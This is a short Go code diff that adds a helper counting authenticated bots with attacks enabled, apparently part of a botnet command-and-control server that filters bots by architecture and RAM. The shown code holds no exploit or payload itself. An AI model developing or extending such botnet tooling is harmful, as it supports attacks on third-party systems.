@@ -363,6 +363,19 @@ func getBotCount() int {
 	return count
 }
 
+// getAttackBotCount returns the number of bots with attacks enabled.
+func getAttackBotCount() int {
+	botConnsLock.RLock()
+	defer botConnsLock.RUnlock()
+	count := 0
+	for _, bc := range botConnections {
+		if bc.authenticated && bc.attacksEnabled {
+			count++
+		}
+	}
+	return count
+}
+
 // countFilteredBots returns the number of authenticated bots matching the given filters
 func countFilteredBots(archFilter string, minRAM int64, maxBots int) int {
 	botConnsLock.RLock()
